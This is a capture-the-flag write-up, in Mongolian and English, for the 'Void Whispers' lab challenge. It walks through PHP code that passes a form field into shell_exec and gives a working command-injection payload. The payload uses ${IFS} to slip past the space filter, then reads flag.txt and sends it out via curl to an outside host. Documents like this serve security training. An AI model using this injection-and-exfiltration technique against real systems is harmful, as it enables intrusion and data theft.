# Void Whispers - (sendmail RCE)

Вэбсайт руу хандаж орох үед дараах байдалтай харагдана.

[image]

Бид үүн дээр нэмж тохиргоо хийж болхоор харагдаж байна. Гэхдээ үүнээс өмнө бидэнд өгөгдсөн source кодыг харах нь зүйтэй юм.

[image]

We are provided with the source code of this application, so let's examine how this functionality works.

## In IndexController.php:

```php
class IndexController
{
 private $configFile = 'config.json';
 private $config;
 public function __construct() {
 if (file_exists($this->configFile)) {
 $this->config = json_decode(file_get_contents($this->configFile), true);
 } else {
 $this->config = array(
 'from' => 'Ghostly Support',
 'email' => 'support@void-whispers.htb',
 'sendMailPath' => '/usr/sbin/sendmail',
 'mailProgram' => 'sendmail',
 );
 }
 }
 ... SNIP ...
 public function updateSetting($router)
 {
 $from = $_POST['from'];
 $mailProgram = $_POST['mailProgram'];
 $sendMailPath = $_POST['sendMailPath'];
 $email = $_POST['email'];
 if (empty($from) || empty($mailProgram) || empty($sendMailPath) || empty($email)) {
 return $router->jsonify(['message' => 'All fields required!', 'status' => 'danger'],
400);
 }
 if (preg_match('/\s/', $sendMailPath)) {
 return $router->jsonify(['message' => 'Sendmail path should not contain spaces!',
'status' => 'danger'], 400);
 }
 $whichOutput = shell_exec("which $sendMailPath");
 if (empty($whichOutput)) {
 return $router->jsonify(['message' => 'Binary does not exist!', 'status' => 'danger'],
400);
 }
 $this->config['from'] = $from;
 $this->config['mailProgram'] = $mailProgram;
 $this->config['sendMailPath'] = $sendMailPath;
 $this->config['email'] = $email;
 file_put_contents($this->configFile, json_encode($this->config));
  return $router->jsonify(['message' => 'Config updated successfully!', 'status' =>
'success'], 200);
 }
}
```

This PHP function, **updateSetting**, is responsible for updating email-related configuration settings. It takes user input from a form (**from, mailProgram, sendMailPath, and email**) and performs the following checks:

1. **Validation:** Ensures all fields are provided and that the sendMailPath does not contain spaces.
2. **Check for Binary Existence:** Uses shell\_exec to check if the provided sendMailPath exists on the system.
3. **Update Configuration:** If validation passes, it updates the configuration file ($this->configFile) with the new settings and saves them in JSON format.
4. **Response:** Returns success or error messages using the jsonify method based on the outcome of the process

## Lets Exploit!

Тухайн input хэсэг нь бидний оруулах ЗАЙ - SPACE-ийг хориглоно. Мөн shell\_exec гэх мэт функц байвал **Binary does not exist!** гэж алдаа заана.

Тиймээс үүнийг тойрч гарахын тулд дараах командыг ашиглаж болно.

```bash
${IFS} - зай (space)
?x=$(cat${IFS}/flag.txt) - flag.txt-ийг уншаад x параметрээр дамжуулж байна
  
/usr/sbin/sendmail;curl${IFS}https://[IP]?x=$(cat${IFS}/flag.txt)
```

[image]
